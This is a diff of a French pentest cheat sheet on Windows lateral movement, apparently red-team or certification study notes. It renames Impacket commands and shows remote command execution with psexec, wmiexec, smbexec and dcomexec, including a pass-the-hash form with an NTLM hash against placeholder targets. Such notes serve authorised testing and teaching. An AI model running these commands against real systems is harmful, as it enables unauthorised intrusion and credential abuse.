@@ -81,10 +81,10 @@ Client
 - Logs SMB et d'authentification
 ## Commandes
 
-**impacket-psexec (depuis Kali)**
+**psexec.py (depuis Kali)**
 
 ```bash
-impacket-psexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+psexec.py corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 ```
 
 **nxc avec smbexec (équivalent psexec via nxc)**
@@ -191,7 +191,7 @@ Client
 
 ## Commandes
 
-**nxc / impacket-wmiexec (depuis Kali)**
+**nxc / wmiexec.py (depuis Kali)**
 
 ```bash
 # nxc
@@ -199,7 +199,7 @@ nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami"
 nxc smb 'IP_CIBLE' -u 'USER' -p 'PASSWORD' -x "whoami" --exec-method wmiexec
 
 # impacket -  shell interactif
-impacket-wmiexec corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+wmiexec.py corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 ```
 
 Si seul le port **445** est disponible, utiliser `smbexec` -  crée un service temporaire via SCM, sans passer par WMI : 
@@ -248,17 +248,17 @@ Client
 
 ## Commandes
 
-**Kali (impacket-dcomexec)**
+**Kali (dcomexec.py)**
 
 ```bash
 # Par défaut : ShellWindows (nécessite explorer.exe actif → échoue sur les serveurs sans session interactive)
 # Préférer MMC20 qui tourne en Session 0 (indépendant des sessions utilisateur)
-impacket-dcomexec -object MMC20 corp.com/'USER':'PASSWORD'@'IP_CIBLE'
-impacket-dcomexec -object ShellWindows corp.com/'USER':'PASSWORD'@'IP_CIBLE'
-impacket-dcomexec -object ShellBrowserWindow corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+dcomexec.py -object MMC20 corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+dcomexec.py -object ShellWindows corp.com/'USER':'PASSWORD'@'IP_CIBLE'
+dcomexec.py -object ShellBrowserWindow corp.com/'USER':'PASSWORD'@'IP_CIBLE'
 
 # Avec hash NTLM
-impacket-dcomexec -hashes :'NTLM_HASH' corp.com/'USER'@'IP_CIBLE'
+dcomexec.py -hashes :'NTLM_HASH' corp.com/'USER'@'IP_CIBLE'
 ```
 
 **Windows (PowerShell)**
